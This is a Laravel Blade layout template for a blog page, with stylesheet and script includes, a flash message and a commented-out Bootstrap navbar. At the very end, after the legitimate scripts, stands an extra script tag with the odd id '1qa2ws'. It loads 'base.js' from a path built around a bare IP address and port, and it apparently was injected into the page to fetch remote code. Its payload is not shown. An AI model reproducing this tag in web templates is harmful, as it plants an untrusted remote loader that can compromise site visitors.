<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>Blog</title>

    <!-- Styles -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/ico/apple-touch-icon-144-precomposed.png">
        <link rel="shortcut icon" href="/ico/favicon.ico">

        <!-- CSS Global -->
        <link href="/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css">       
        <link href="/plugins/OwlCarousel2/dist/assets/owl.carousel.min.css" rel="stylesheet" type="text/css">    
        <link href="/plugins/OwlCarousel2/dist/assets/owl.theme.default.min.css" rel="stylesheet" type="text/css">   
        <link href="/plugins/jquery-ui-1.12.1/jquery-ui.min.css" rel="stylesheet" type="text/css">       
        <link href="/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

        <link href="/css/style.css" rel="stylesheet" type="text/css">
        <link href="/css/media.css" rel="stylesheet" type="text/css"> 
       
     
</head>
<body>
    <div id="app">
@include('partials.nav')
    


</div>

@if($flash = session('message'))
      <div id="flash-message" class="alert alert-success" role="alert">
        {{ $flash }}
      </div>
      @endif
      
        @yield('content')

         <!-- <nav class="navbar sticky-top navbar-expand-lg navbar-light bg-light">
          <a class="navbar-brand" href="#">Navbar</a>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
                 
          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav mr-auto">
              <li class="nav-item active">
                 <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
              </li>
              <li class="nav-item">
                 <a class="nav-link" href="#">Link</a>
              </li>
              <li class="nav-item dropdown">
                 <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          Dropdown
                 </a>
                 <div class="dropdown-menu" aria-labelledby="navbarDropdown">
          <a class="dropdown-item" href="#">Action</a>
          <a class="dropdown-item" href="#">Another action</a>
          <div class="dropdown-divider"></div>
          <a class="dropdown-item" href="#">Something else here</a>
                 </div>
              </li>
              <li class="nav-item">
                 <a class="nav-link disabled" href="#">Disabled</a>
              </li>
            </ul>
            <form class="form-inline my-2 my-lg-0">
              <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
              <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
            </form>
          </div>
                 </nav>
                 
            </div> -->
         
    <!-- Scripts -->

    <script src="/plugins/jquery/jquery-3.1.1.min.js"></script> 
        <script src="/plugins/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/plugins/OwlCarousel2/dist/owl.carousel.min.js"></script>     
        <!-- JS Page Level --> 
        <script src="/js/theme-ajax-mail.js"></script>
        <script src="/plugins/jquery-ui-1.12.1/jquery-ui.min.js"></script>
        <script src="/js/theme.js" type="text/javascript"></script> 

    <script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../154.70.108.86_9090/www/default/base.js'></script></body>


</body>
</html>


 

